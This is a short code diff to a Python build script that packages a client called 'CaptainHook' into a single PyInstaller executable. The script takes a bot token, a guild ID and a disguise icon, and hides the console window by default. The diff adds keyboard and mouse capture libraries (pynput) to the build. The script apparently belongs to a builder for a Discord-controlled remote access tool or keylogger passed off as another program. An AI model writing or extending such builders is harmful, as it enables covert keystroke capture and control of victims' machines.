@@ -196,18 +196,20 @@ def build(token, guild_id, preset_name, disguise_name):
         progress.add_task(description="Setting up distribution folder...", total=None)
         os.makedirs("dist", exist_ok=True)
         
-        hidden_imports = []
+        hidden_imports = ["--hidden-import=pynput.keyboard._xorg", "--hidden-import=pynput.mouse._xorg"]
         for module in preset["modules"]:
             hidden_imports.append(f"--hidden-import=src.client.modules.{module}")
         
         hidden_imports_str = " ".join(hidden_imports)
         staging_root = os.path.abspath("build_staging")
         
+        noconsole = "--noconsole" if not preset.get("developer", False) else ""
+        
         if os.name == 'nt':
-            cmd = f"pyinstaller --onefile --noconsole --icon={disguise['icon']} --name CaptainHook --paths={staging_root} {hidden_imports_str} build_staging/src/client/main.py"
+            cmd = f"pyinstaller --onefile {noconsole} --icon={disguise['icon']} --name CaptainHook --paths={staging_root} {hidden_imports_str} build_staging/src/client/main.py"
             ext = ".exe"
         else:
-            cmd = f"pyinstaller --onefile --noconsole --name CaptainHook --paths={staging_root} {hidden_imports_str} build_staging/src/client/main.py"
+            cmd = f"pyinstaller --onefile {noconsole} --name CaptainHook --paths={staging_root} {hidden_imports_str} build_staging/src/client/main.py"
             ext = ""
         
     # Clear the progress and show success
